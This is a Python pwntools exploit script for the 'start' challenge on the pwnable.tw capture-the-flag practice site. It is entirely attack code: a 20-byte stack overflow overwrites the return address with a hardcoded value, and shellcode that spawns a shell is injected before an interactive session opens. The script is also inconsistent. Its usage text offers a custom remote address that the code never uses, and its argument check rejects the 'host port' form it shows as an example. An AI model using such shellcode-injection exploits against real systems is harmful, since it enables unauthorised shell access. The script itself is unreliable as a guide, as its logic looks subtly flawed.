from pwn import *
import sys

if __name__ == "__main__":
    context.arch = 'i386'

    # Check command line arguments
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        print("Target can be 'local' or a remote address (e.g., chall.pwnable.tw 10000)")
        sys.exit(1)

    target = sys.argv[1]

    if target == 'local':
        p = process('./start')
    else:
        p = remote('chall.pwnable.tw', 10000)

    payload = b"A" * 20
    shellcode = asm(shellcraft.sh())
    return_addr = p32(0x804809d)
    payload += return_addr
    payload += shellcode

    print("Sending Payload...")
    p.send(payload)
    print("Payload injected.")
    p.interactive()
